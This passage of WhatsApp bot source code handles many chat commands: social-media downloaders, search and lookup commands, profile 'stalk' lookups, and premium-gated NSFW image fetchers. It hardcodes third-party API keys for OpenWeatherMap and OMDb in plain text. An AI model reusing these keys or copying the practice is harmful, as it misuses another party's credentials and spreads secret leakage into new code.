	if (!text) return newReply(`⚠️ Oops, you forgot to give keywords! 😅\nTry typing like this: *${prefix + command} sad* 😉`);
	let search = await tiktokSearchVideo(text);
	let captionText = `🎥 ${search.videos[0].title}\n\n`;
	captionText += `🆔 *Video ID*: ${search.videos[0].video_id}\n`;
	captionText += `👤 *Username*: ${search.videos[0].author.unique_id}\n`;
	captionText += `🏷️ *Nickname*: ${search.videos[0].author.nickname}\n`;
	captionText += `⏳ *Duration*: ${search.videos[0].duration} seconds\n`;
	captionText += `❤️ *VT Like*: ${search.videos[0].digg_count}\n`;
	captionText += `💬 *Comment*: ${search.videos[0].comment_count}\n`;
	captionText += `🔄 *Share*: ${search.videos[0].share_count}\n\n`;
	captionText += `🔗 *Link*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;	
	m.reply({
		video: { url: `https://tikwm.com${search.videos[0].play}` },
		caption: captionText,
		footer: footer,
		buttons: [
			{
				buttonId: `${prefix + command} ${text}`,
				buttonText: { displayText: "Search Again 🔍" }
			},
			{
				buttonId: `.ttmp3 https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`,
				buttonText: { displayText: "Download MP3 🎵" }
			}
		],
		viewOnce: true
	});
};
break;
      			case 'presetam': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Oops, you forgot to give the URL! 😗 Try typing like this: *${prefix + command} [Alight Motion URL]*`);
				if (!(text.includes('http://') || text.includes('https://'))) {
					return newReply(`⚠️ Invalid URL. Try using a URL starting with http:// or https://`);
				}
				if (!(text.includes('alight.link') || text.includes('alightcreative.com'))) {
					return newReply(`⚠️ The given URL is not an Alight Motion URL!`);
				}
				try {
					await m.react('⏱️');
					const result = await alightScrape(text);
					if (result.error) {
						return newReply(result.error);
					}
					const { title, description } = result;
					await newReply(`「 *PRESET ALIGHT MOTION* 」\n\n · *Title*: ${title}\n · *Description*: ${description}`);
				} catch (error) {
					console.error(error);
					newReply('⚠️ An error occurred while fetching data from the URL!');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'soundcloudsearch':
			case 'scsearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Oops, you forgot to give the keywords! 😗 Try typing like this: *${prefix + command} <query>*`);
				try {
					let results = await scrapeSoundCloud(text);	// Call scraper function for SoundCloud
					if (results.length === 0) return newReply('😔 Sorry, Kak! No results found. Try different keywords!');
					let teks = `🎧 *SoundCloud Search Results for*: ${text}\n\n`;
					let list = '';
					let no = 1;
					for (let i of results) {
						list += `\n${no++}. 🎵 *${i.title}*\n` +
							`🔗 *Link*: ${i.url}\n`;
					}
					await sock.sendMessage(
						m.chat,
						{
							text: teks + list
						},
						{ quoted: m }
					);
				} catch (error) {
					console.log(error);
					newReply('⚠️ An error occurred while searching SoundCloud, try again later!');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case "facebook":
			case "fbdl": {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Use format: \n${prefix + command} <video_link>\n\nExample:\n${prefix + command} https://www.facebook.com/IrfanBrnsd/videos/559557717015956/`);
				try {
					newReply("⏳ Processing video, please wait...");
					const videoDetails = await fdown.download(text);		
					if (!videoDetails.length) {
						return newReply("❌ Video not found or invalid link!");
					}
					const videoInfo = videoDetails[0];
					const message = `🎬 *Video Details:*\n\n📌 *Title*: ${videoInfo.title || "Unknown"}\n📝 *Description*: ${videoInfo.description || "Not available"}\n⏱ *Duration*: ${videoInfo.duration || "Unknown"}`;
					await sock.sendMessage(
						m.chat,
						{ image: { url: videoInfo.thumbnail || '' }, caption: message },
						{ quoted: m }
					);
					if (videoInfo.hdQualityLink) {
						await sock.sendMessage(
							m.chat,
							{ video: { url: videoInfo.hdQualityLink }, caption: "🎥 HD Quality Video" },
							{ quoted: m }
						);
					} else if (videoInfo.normalQualityLink) {
						await sock.sendMessage(
							m.chat,
							{ video: { url: videoInfo.normalQualityLink }, caption: "🎥 SD Quality Video" },
							{ quoted: m }
						);
					} else {
						newReply("❌ Failed to download video!");
					}
				} catch (error) {
					console.error(error);
					newReply("❌ An error occurred while processing your request. Make sure the link is valid.");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'igstory':
			case 'igs':
			case 'instagramstory':
			case 'instastory':
			case 'igslide':
			case 'igphoto':
			case 'instaphoto':
			case 'instafoto':
			case 'igfoto':
			case 'instagram':
			case 'ig':
			case 'igdl':
			case 'igvideo':
			case 'instavideo':
			case 'instavid':
			case 'igreels':
			case 'instareels':
			case 'instareel':
			case 'igtv':
			case 'instatv': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("⚠️ Sorry Kak, your limit is empty. Upgrade to premium or wait until tomorrow! 😊");
				if (!text) return newReply(`⚠️ Send command: ${prefix + command} <url>\n\n🤔 Example:\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`);
				if (!/instagram.com/.test(text)) return newReply("> Please enter a valid Instagram link, Kak! 🙏");
				try {
					let data = await Instagram(text);
					if (!data) return newReply("❌ Failed to get data from that link. Check the link again, Kak!");
					for (let i of data.url) {
						let res = await fetch(i);
						let buffer = Buffer.from(await res.arrayBuffer());
						let caption = "「 *INSTAGRAM DL* 」\n\n";
						caption += `👤 *Username*: ${data.metadata.username || 'Not available'}\n`;
						caption += `📝 *Caption*: ${data.metadata.caption || 'None'}\n`;
						caption += `❤️ *Likes*: ${data.metadata.like || 0}\n`;
						caption += `💬 *Comments*: ${data.metadata.comment || 0}\n`;
						caption += `🔗 *Source*: ${text}`;
						if (data.metadata.isVideo) {
							sock.sendFile(m.chat, buffer, 'video.mp4', caption, m);
						} else {
							sock.sendFile(m.chat, buffer, 'image.jpg', caption, m);
						}
					}
				} catch (error) {
					console.error(error);
					await newReply("❌ An error occurred while processing the request. Try again later, Kak! 🙏");
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'git': 
			case 'gitclone': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!args[0]) return newReply(`📦 *Where's the link, Kak?*\n\nExample:\n${prefix}${command} https://github.com/user/repo`);
				if (!isUrl(args[0]) || !args[0].includes('github.com')) 
					return newReply(`❌ *Invalid link!* Make sure the link is from GitHub, Kak.`);
				try {
					await m.react('⏳');
					let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
					let [, user, repo] = args[0].match(regex) || [];
					if (!user || !repo) return newReply(`❌ *Failed to read repository link!* Make sure the link is correct, Kak.`);
					repo = repo.replace(/.git$/, '');
					let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
					let data = await fetch(url, { method: 'HEAD' });
					let filename = data.headers.get('content-disposition')?.match(/attachment; filename=(.*)/)?.[1] || `${repo}.zip`;
					await sock.sendMessage(m.chat, {
						document: { url: url },
						fileName: filename,
						mimetype: 'application/zip'
					}, { 
						quoted: m 
					});
					newReply(`✅ *Successfully sent GitHub repository file!*\nFile Name: ${filename}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ *An error occurred while downloading the repository!* 😭\n${err.message || err}`);
					}
				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'cuaca':
			case 'weather': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`🌍 *Where's the location, Kak?*\n\nExample:\n${prefix}${command} Jakarta`);
				try {
					await m.react('⏳');
					let { data } = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`);
					let weatherInfo = `🌦️ *Weather Information in ${data.name}, ${data.sys.country}*\n`;
					weatherInfo += `🌡️ *Temperature*: ${data.main.temp}°C (Feels like ${data.main.feels_like}°C)\n`;
					weatherInfo += `🌬️ *Wind Speed*: ${data.wind.speed} m/s\n`;
					weatherInfo += `💧 *Humidity*: ${data.main.humidity}%\n`;
					weatherInfo += `🔄 *Air Pressure*: ${data.main.pressure} hPa\n`;
					weatherInfo += `📍 *Coordinates*: ${data.coord.lat}, ${data.coord.lon}\n`;
					weatherInfo += `📝 *Description*: ${data.weather[0].description}\n`;		
					await sock.sendMessage(m.chat, { text: weatherInfo }, { quoted: m });
					newReply(`✅ *Weather information successfully sent!*`);
				} catch (err) {
					console.error(err);
					if (err.response && err.response.status === 404) {
						newReply(`❌ *Location not found!* Check the location name again, Kak.`);
					} else {
						newReply(`❌ *An error occurred while fetching weather data!* 😭\n${err.message || err}`);
					}
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'bukalapak': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Uh-oh, you forgot to give keywords! 🫣 Try typing like this: *${prefix + command} iPhone 15 Case* so I can help find products! 🛒✨`);
				try {
					let hasil = await BukaLapak(text);
					if (!hasil || hasil.length === 0) {
						return newReply('❌ No results found for that search, try other keywords, Kak!');
					}
					let replyText = `🛒 *Bukalapak Search Results:*\n🔍 *Keywords*: ${text}\n\n`;
					hasil.slice(0, 3).forEach((item, i) => {
						replyText += `*${i + 1}. ${item.title}*\n`;
						replyText += `💵 *Price*: ${item.harga}\n`;
						replyText += `⭐ *Rating*: ${item.rating}\n`;
						replyText += `📦 *Sold*: ${item.terjual}\n`;
						replyText += `📍 *Store Location*: ${item.store.lokasi}\n`;
						replyText += `🏬 *Store*: ${item.store.nama}\n`;
						replyText += `🛒 *Store Link*: ${item.store.link}\n`;
						replyText += `🔗 *Product Link*: ${item.link}\n\n`;
					});
					await sock.sendMessage(
						m.chat,
						{
							image: { url: hasil[0].image },
							caption: `🖼️ *First Product Image*: ${hasil[0].title}`
						},
						{ quoted: m }
					);
					await sock.sendMessage(
						m.chat,
						{
							text: replyText
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error('Error Bukalapak:', error.response?.data || error.message);
					await newReply(`❌ An error occurred while fetching data from Bukalapak. Try again later, Kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'playstore': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Uh-oh, you forgot to give keywords! 🫣 Try typing like this: *${prefix + command} WhatsApp* so I can help search for the app! 📲✨`);
				try {
					await m.react('⏱️');
					let hasil = await PlayStore(text);
					if (!hasil || hasil.length === 0 || hasil.message) {
						return newReply('❌ No results found for that search, try other keywords, Kak!');
					}
					let replyText = `📲 *Play Store Search Results:*\n🔍 *Keywords*: ${text}\n\n`;
					hasil.slice(0, 3).forEach((item, i) => {
						replyText += `*${i + 1}. ${item.nama}*\n`;
						replyText += `👤 *Developer*: ${item.developer}\n`;
						replyText += `⭐ *Rating*: ${item.rate}\n`;
						replyText += `🔗 *Link*: ${item.link}\n`;
						replyText += `🏢 *Developer Link*: ${item.link_dev}\n\n`;
					});
					await sock.sendMessage(
						m.chat,
						{
							image: { url: hasil[0].img },
							caption: `🖼️ *First App Image*: ${hasil[0].nama}`
						},
						{ quoted: m }
					);
					await sock.sendMessage(
						m.chat,
						{
							text: replyText
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error('Error Play Store:', error.response?.data || error.message);
					await newReply(`❌ An error occurred while fetching data from Play Store. Try again later, Kak!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'umma': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Use: ${prefix + command} *article url*`);
				try {
					const result = await umma(text);
					newReply(`📖 *Article*: ${result.title}\n\n👤 *Author*: ${result.author.name}\n💬 *Caption*: ${result.caption}\n\n🔗 *Source*: ${text}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ There was a problem fetching the article from Umma, Kak! Try again later 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'githubstalk': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Use: ${prefix + command} *github username*\n\n🤔 *Example:*\n\n${prefix + command} aku`);
				try {
					const userInfo = await githubstalk(text);
					console.log(userInfo);
					newReply(`🧑‍💻 *Username*: ${userInfo.username || 'Anonymous'}\n🌟 *Nickname*: ${userInfo.nickname || 'Anonymous'}\n📝 *Bio*: ${userInfo.bio || 'Not available'}\n🆔 *ID*: ${userInfo.id}\n🔑 *NodeID*: ${userInfo.nodeId}\n🔗 *Url*: ${userInfo.url}\n🏷️ *Type*: ${userInfo.type}\n👑 *Admin*: ${userInfo.admin ? 'Yes' : 'No'}\n🏢 *Company*: ${userInfo.company || 'None'}\n🌐 *Blog*: ${userInfo.blog || 'None'}\n📍 *Location*: ${userInfo.location || 'Unknown'}\n📧 *Email*: ${userInfo.email || 'Not available'}\n📚 *Public Repo*: ${userInfo.public_repo}\n🎁 *Public Gists*: ${userInfo.public_gists}\n👥 *Followers*: ${userInfo.followers}\n➕ *Following*: ${userInfo.following}\n🕰️ *Created At*: ${userInfo.created_at}\n🔄 *Updated At*: ${userInfo.updated_at}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ There was a problem fetching GitHub data, Kak! Try again later 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
case 'npmstalk': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Use: ${prefix + command} *npm package name*\n\n🤔 *Example:*\n\n${prefix + command} axios`);
				try {
					const npmInfo = await npmstalk(text);
					newReply(`📦 *Package*: ${npmInfo.name}\n🔢 *Latest Version*: ${npmInfo.versionLatest}\n📅 *Publish Time*: ${npmInfo.publishTime}\n🔧 *Latest Dependencies*: ${npmInfo.latestDependencies}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ There was a problem fetching data from NPM, Kak! Try again later 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'ffchars':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let characters = await ffCh();
				let charList = characters.map((char, index) => `${index + 1}. 🎮 *${char.name}*\n💬 ${char.desc}\n🔗 Link: https://ff.garena.com/id/chars/${char.id}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: `*Free Fire Characters List:*\n\n${charList}` }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffcharinfo':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let charId = text.split(' ')[1]; // Assume character ID after keyword
				if (!charId) return newReply('⚠️ Character ID not found!');
				let charDetails = await ffChSkill(charId);
				let charInfo = charDetails.map(detail => `*Title*: ${detail.title}\n*Name*: ${detail.name}\n*Skill*: ${detail.skill}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: charInfo }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffnews':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let news = await ffNews();
				let newsList = news.map(item => `📰 *${item.title}*\n🕒 *${item.time}*\n🔗 Link: ${item.link}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: `*Latest Free Fire News:*\n\n${newsList}` }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffpets':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let pets = await ffPet();
				let petList = pets.map((pet, index) => `${index + 1}. 🐾 *${pet.name}*\n💬 ${pet.talk}\n🔗 Link: https://ff.garena.com/id/pets/${pet.id}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: `*Free Fire Pets List:*\n\n${petList}` }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffpetskill':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let petId = text.split(' ')[1]; // Assume pet ID after keyword
				if (!petId) return newReply('⚠️ Pet ID not found!');
				let petDetails = await ffPetSkill(petId);
				let petInfo = petDetails.map(detail => `*Name*: ${detail.name}\n*Skill*: ${detail.skill}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: petInfo }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'mlstalk': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Use: ${prefix + command} *gameId zoneId*\n\n🤔 *Example:*\n\n${prefix + command} 12345 1`);
				const [gameId, zoneId] = text.split(' ');
				try {
					const gameDetail = await mlstalk(gameId, zoneId);
					newReply(`🎮 *Game*: ${gameDetail.userName}\n🛒 *Price*: ${gameDetail.price || '0'}\n🔗 ${gameDetail.topUpUrl || 'No URL.'}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ There was a problem fetching data from DuniaGames, Kak! Try again later 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'imdb': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`🎬 *Where's the movie or series title, Kak?*\n\nExample:\n${prefix}${command} Inception`);
				try {
					await m.react('⏳');
					let { data } = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${encodeURIComponent(text)}&plot=full`);
					if (data.Response === 'False') {
						return newReply(`❌ *Movie or series not found!* Check the title again, Kak.`);
					}
					let imdbInfo = `🎬 *Title*: ${data.Title}\n`;
					imdbInfo += `📅 *Year*: ${data.Year}\n`;
					imdbInfo += `⭐ *Rating*: ${data.Rated}\n`;
					imdbInfo += `📆 *Release*: ${data.Released}\n`;
					imdbInfo += `⏳ *Duration*: ${data.Runtime}\n`;
					imdbInfo += `🌀 *Genre*: ${data.Genre}\n`;
					imdbInfo += `👨‍💼 *Director*: ${data.Director}\n`;
					imdbInfo += `✍️ *Writer*: ${data.Writer}\n`;
					imdbInfo += `👥 *Actors*: ${data.Actors}\n`;
					imdbInfo += `📖 *Plot*: ${data.Plot}\n`;
					imdbInfo += `🌐 *Language*: ${data.Language}\n`;
					imdbInfo += `🌍 *Country*: ${data.Country}\n`;
					imdbInfo += `🏆 *Awards*: ${data.Awards}\n`;
					imdbInfo += `💵 *Box Office*: ${data.BoxOffice || '-'}\n`;
					imdbInfo += `🏙️ *Production*: ${data.Production || '-'}\n`;
					imdbInfo += `🌟 *IMDb Rating*: ${data.imdbRating}\n`;
					imdbInfo += `✅ *IMDb Votes*: ${data.imdbVotes}\n`;
					await sock.sendMessage(m.chat, {
						image: { url: data.Poster || 'https://via.placeholder.com/300x450?text=No+Poster' },
						caption: imdbInfo,
					}, { quoted: m });
					newReply(`✅ *Successfully displayed movie information!*`);
				} catch (err) {
					console.error(err);
					newReply(`❌ *An error occurred while searching for the movie!* 😭\n${err.message || err}`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'gddl':
			case 'gdrivedl':
			case 'gdrive': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Use ${prefix + command} <url>`)
				if (!text.includes('drive')) return newReply('Invalid link')
				try {
					const res = await GDriveDl(text);
					if (res.error) return newReply('Invalid URL, check if the URL access is public?')
					sock.sendMessage(m.chat, {
						document: {
							url: res.downloadUrl
						},
						mimetype: res.mimetype,
						fileName: res.fileName,
						caption: `*GOOGLE DRIVE*\n\n*Name*: ${res.fileName}\n*Size*: ${res.fileSize}\n*Type*: ${res.mimetype}`
					}, {
						quoted: m
					})
				} catch (error) {
					console.log(error);
					newReply('Failed during action, if you are the owner please check console.');
				};
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'pinterest': case 'pin': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Enter Query!`);
				await m.react('⏱️');
				async function createImage(url) {
					const { imageMessage } = await generateWAMessageContent({
						image: {
							url
						}
					}, {
						upload: sock.waUploadToServer
					});
					return imageMessage;
				}
				function shuffleArray(array) {
					for (let i = array.length - 1; i > 0; i--) {
						const j = Math.floor(Math.random() * (i + 1));
						[array[i], array[j]] = [array[j], array[i]];
					}
				}
				let push = [];
				let anutrest = await pinterest(text);
				shuffleArray(anutrest);
				let selectedImages = anutrest.slice(0, 5);
				let i = 1;
				for (let message of selectedImages) {
					push.push({
						body: proto.Message.InteractiveMessage.Body.fromObject({
							text: `👤 *Uploaded by*: ${message.upload_by}\n` +
							`📛 *Full Name*: ${message.fullname}\n` +
							`👥 *Followers*: ${message.followers}\n` +
							`📝 *Caption*: ${message.caption}`
						}),
						footer: proto.Message.InteractiveMessage.Footer.fromObject({
							text: footer
						}),
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: `*Image* - ${i++}`,
							hasMediaAttachment: true,
							imageMessage: await createImage(message.image)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [
								{
									"name": "cta_url",
									"buttonParamsJson": `{
										"display_text": "View Source 👀",
										"url": "${message.source}", 
										"merchant_url": "${message.source}"
									}`
								}
							]
						})
					});
				}
				const msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.fromObject({
								body: proto.Message.InteractiveMessage.Body.create({
									text: mess.done
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: footer
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									hasMediaAttachment: false
								}),
								carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
									cards: [
										...push
									]
								})
							})
						}
					}
				}, { 
					quoted: m 
				});
				await sock.relayMessage(m.chat, msg.message, {
					messageId: msg.key.id
				});
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'savepin': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Example: ${prefix + command} https://pin.it/34Gef3SlC`)
				if (!text.includes('pin')) return newReply(`Invalid Link!!`)
				try {
					await m.react('⏱️');
					const res = await savePin(text);
					const { title, results } = res
					let media = results[0]
					let caption = `✨ *Title*: ${title}\n📥 *Type*: ${media.type}\n📁 *Format*: ${media.format}`
					if (media.format === 'MP4') {
						await sock.sendMessage(m.chat, { caption, video: { url: media.downloadLink } }, { quoted: m })
					} else if (media.format === 'JPG') {
						await sock.sendMessage(m.chat, { caption, image: { url: media.downloadLink } }, { quoted: m })
					} else {
						return newReply('Media format not supported.')
					}
				} catch (err) {
					console.error(err)
					newReply('An error occurred while processing the request.')
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'quoteanime':
			case 'animequote':
			case 'quotesanime': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let quotes = await quotesAnime();
					if (!quotes || quotes.length === 0) {
						return newReply(`⚠️ Wow, I couldn't find any anime quotes, Kak! Try again later 🥲`);
					}
					let randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
					await sock.sendMessage(
						m.chat,
						{
							image: { url: randomQuote.gambar },
							caption: `🎌 *Anime Quote* 🎌\n\n` +
							`🗣️ *Character*: ${randomQuote.karakter || '-'}\n` +
							`📺 *Anime*: ${randomQuote.anime || '-'}\n` +
							`🎬 *Episode*: ${randomQuote.episode || '-'}\n` +
							`📅 *Uploaded*: ${randomQuote.up_at || '-'}\n\n` +
							`💬 *Quote*: "${randomQuote.quotes || '-'}"\n\n` +
							`🔗 *Source*: ${randomQuote.link}`
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error(error);
					await newReply(`❌ Wow, there was an error fetching anime quotes, Kak! Try again later 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'anime': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) {
					return newReply('⚠️ *Where's the anime title, Kak?* Try typing the anime name you want to search! 🫣');
				}
				const malScraper = require('mal-scraper');
				await newReply('⏳ *Wait a moment, I'm searching for the data...* 📚✨');
				const anime = await malScraper.getInfoFromName(text).catch(() => null);
				if (!anime) {
					return newReply('❌ *Oops, the anime you're looking for wasn't found...* 🥺 Try typing a more specific title!');
				}
				let animeInfo = `🎀 *《 ANIME INFO 》* 🎀\n\n📚 *Title*: ${anime.title}\n🎭 *Type*: ${anime.type}\n📅 *Premiere Date*: ${anime.premiered || '-'}\n🎬 *Total Episodes*: ${anime.episodes || '-'}\n📈 *Status*: ${anime.status || '-'}\n💠 *Genre*: ${anime.genres || '-'}\n🏢 *Studio*: ${anime.studios || '-'}\n⭐ *Score*: ${anime.score || '-'}\n🔖 *Rating*: ${anime.rating || '-'}\n🏅 *Rank*: ${anime.ranked || '-'}\n🔥 *Popularity*: ${anime.popularity || '-'}\n🎥 *Trailer*: ${anime.trailer || '-'}\n🌐 *MAL Link*: ${anime.url || '-'}\n📝 *Description*: ${anime.synopsis || 'No description available.'}\n\n✨ *Enjoy the anime info, Kak!* 😊🎌`;
	await sock.sendMessage(
		m.chat,
		{ 
			image: { url: anime.picture || imageUrl }, 
			caption: animeInfo 
		},
		{ quoted: m }
	);
}
db.data.users[m.sender].limit -= 1;
break;

case 'waifu':
case 'neko': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	await m.react('⏱️');
	const data = await fetchJson(`https://api.waifu.pics/sfw/${command}`);
	m.reply({
		image: { url: data.url },
		caption: `Here you go Kak ${pushname}, ${command} 😋☕`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: {
					displayText: "🔄 Next Again"
				}
			},
			{
				buttonId: `${prefix}menu`,
				buttonText: {
					displayText: "📜 Back to Menu"
				}
			}
		],
		viewOnce: true
	});
};
db.data.users[m.sender].limit -= 1;
break;

case 'bluearchive':
case 'randombluearchive': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	await m.react('⏱️');
	const data = await fetchJson(`https://api.siputzx.my.id/api/r/blue-archive`);
	m.reply({
		image: { url: data.url },
		caption: `Here you go Kak ${pushname}, Random Blue Archive 😋☕`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: {
					displayText: "🔄 Next Again"
				}
			},
			{
				buttonId: `${prefix}menu`,
				buttonText: {
					displayText: "📜 Back to Menu"
				}
			}
		],
		viewOnce: true
	});
};
db.data.users[m.sender].limit -= 1;
break;

case 'hwaifu': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	await m.react('⏱️');
	const data = await fetchJson(`https://api.waifu.pics/nsfw/waifu`);
	m.reply({
		image: { url: data.url },
		caption: `⚠️ *NSFW Content Detected!* ⚠️\n\nHello, Kak! This feature contains sensitive content and should only be accessed by users of appropriate age. Don't forget, momentary pleasure shouldn't make you forget time and responsibilities! 🫣\n\nUse this feature wisely and don't overdo it. Remember, balance is important! 🧠✨`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: { displayText: "🔄 Next Again" }
			},
			{
				buttonId: `${prefix}menu`,
				buttonText: { displayText: "📜 Back to Menu" }
			}
		],
		viewOnce: true
	});
	db.data.users[m.sender].limit -= 1;
}
break;

case 'hneko': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	await m.react('⏱️');
	const data = await fetchJson(`https://api.waifu.pics/nsfw/neko`);
	m.reply({
		image: { url: data.url },
		caption: `⚠️ *NSFW Content Detected!* ⚠️\n\nHello, Kak! This feature contains sensitive content and should only be accessed by users of appropriate age. Don't forget, momentary pleasure shouldn't make you forget time and responsibilities! 🫣\n\nUse this feature wisely and don't overdo it. Remember, balance is important! 🧠✨`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: { displayText: "🔄 Next Again" }
			},
			{
				buttonId: `${prefix}menu`,
				buttonText: { displayText: "📜 Back to Menu" }
			}
		],
		viewOnce: true
	});
	db.data.users[m.sender].limit -= 1;
}
break;

case 'trap': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	await m.react('⏱️');
	const data = await fetchJson(`https://api.waifu.pics/nsfw/${command}`);
	m.reply({
		image: { url: data.url },
		caption: `⚠️ *NSFW Content Detected!* ⚠️\n\nHello, Kak! This feature contains sensitive content and should only be accessed by users of appropriate age. Don't forget, momentary pleasure shouldn't make you forget time and responsibilities! 🫣\n\nUse this feature wisely and don't overdo it. Remember, balance is important! 🧠✨`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: { displayText: "🔄 Next Again" }
			},
			{
				buttonId: `${prefix}menu`,
				buttonText: { displayText: "📜 Back to Menu" }
			}
		],
		viewOnce: true
	});
	db.data.users[m.sender].limit -= 1;
}
break;

case 'blowjob': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	await m.react('⏱️');
	const data = await fetchJson(`https://api.waifu.pics/nsfw/${command}`);
	m.reply({
		image: { url: data.url },
		caption: `⚠️ *NSFW Content Detected!* ⚠️\n\nHello, Kak! This feature contains sensitive content and should only be accessed by users of appropriate age. Don't forget, momentary pleasure shouldn't make you forget time and responsibilities! 🫣\n\nUse this feature wisely and don't overdo it. Remember, balance is important! 🧠✨`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: { displayText: "🔄 Next Again" }
			},
			{
				buttonId: `${prefix}menu`,
